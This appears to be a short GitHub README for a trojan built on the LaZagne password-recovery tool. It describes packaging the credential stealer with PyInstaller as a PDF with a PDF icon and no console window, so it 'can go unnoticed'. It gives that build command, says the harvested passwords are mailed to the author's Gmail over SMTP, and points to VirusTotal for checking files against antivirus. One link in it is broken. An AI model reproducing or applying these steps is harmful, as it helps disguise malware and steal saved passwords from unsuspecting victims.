# lazagne
python script for password recovery on the system.(It's cross-platform).

Based off of [AlessandroZ](https://github.com/AlessandroZ/LaZagne) credential recovery project. That let's you access passwords saved on a particular computer.

using the SMTP module i can have the password sent to my gmail.
https://
.org/en/stable/usage.html#options
Much safer to use linux distrubution such as the Kali linux

On the Kali linux:

`pip install PyInstaller `

Pyinstaller enables you to wrap the lazagne.exe into a pdf document so that it can go unnoticed.
The pdf should be wrapped with a pdf icon image. To make it look like a [trojan](https://en.wikipedia.org/wiki/Trojan_horse_(computing)).



`python -m PyInstaller --add-data 'sample.pdf':. --onefile --noconsole --icon image.ico download.py`

Sending client passwords to mail
![lazagnein](https://user-images.githubusercontent.com/61822296/208983918-c10d4ec7-c05f-488f-b014-0eb80edbf643.png)



![lazagne](https://user-images.githubusercontent.com/61822296/207891064-efee45e0-2f6d-443f-a197-69e09cf2347e.png)

# Resources

Pyinstaller docs - https://pyinstaller.org/en/stable/usage.html#options

Tool for testing documents for viruses - https://www.virustotal.com/gui/home/upload

